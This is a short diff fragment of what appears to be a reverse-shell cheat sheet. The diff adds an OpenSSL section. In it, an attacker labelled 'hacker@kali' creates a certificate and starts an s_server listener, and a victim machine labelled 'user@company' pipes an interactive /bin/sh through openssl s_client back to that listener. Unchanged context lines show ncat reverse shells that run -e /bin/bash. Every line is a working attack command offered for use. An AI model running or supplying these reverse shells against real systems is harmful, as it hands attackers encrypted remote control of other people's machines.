@@ -97,6 +97,15 @@ ncat 127.0.0.1 4444 -e /bin/bash
 ncat --udp 127.0.0.1 4444 -e /bin/bash
 ```
 
+## OpenSSL
+
+```powershell
+hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+hacker@kali$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+
+user@company$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:4242 > /tmp/s; rm /tmp/s
+```
+
 ### Powershell
 
 ```powershell
